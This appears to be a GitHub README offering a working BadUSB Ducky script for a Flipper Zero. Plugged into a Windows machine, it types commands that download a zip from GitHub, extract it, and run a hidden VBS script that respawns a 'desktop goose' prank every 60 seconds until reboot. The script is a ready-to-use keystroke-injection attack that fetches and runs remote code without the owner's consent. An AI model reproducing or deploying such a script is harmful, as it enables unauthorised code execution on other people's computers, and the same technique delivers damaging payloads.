# Badusb-desktop-goose
Script for a badusb that will download and run a desktop goose every 60 seconds. To stop the spawining of the geese you have to restart your computer. You can also hold down ESC to evict the geese(the will come back)

Credit for the desktop goose goes to [Sam Chiet](twitter.com/samnchiet)

## Ducky script(tested and working on flipper zero):
```
REM Download goose and unzip
DELAY 500
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 500
STRING powershell (New-Object System.Net.WebClient).DownloadFile('https://github.com/Ferferite/Badusb-desktop-goose/archive/refs/heads/main.zip', 'C:\Users\Public\Badusb-desktop-goose.zip')
DELAY 500
ENTER
DELAY 1000
STRING powershell Expand-Archive -Path 'C:\Users\Public\Badusb-desktop-goose.zip' -DestinationPath 'C:\Users\Public\Temp'
DELAY 500
ENTER
DELAY 500
STRING cd C:\Users\Public\Temp\Badusb-desktop-goose-main
DELAY 500
ENTER
STRING cscript inviswindow.vbs
DELAY 500
ENTER
STRING exit
DELAY 100
ENTER
```
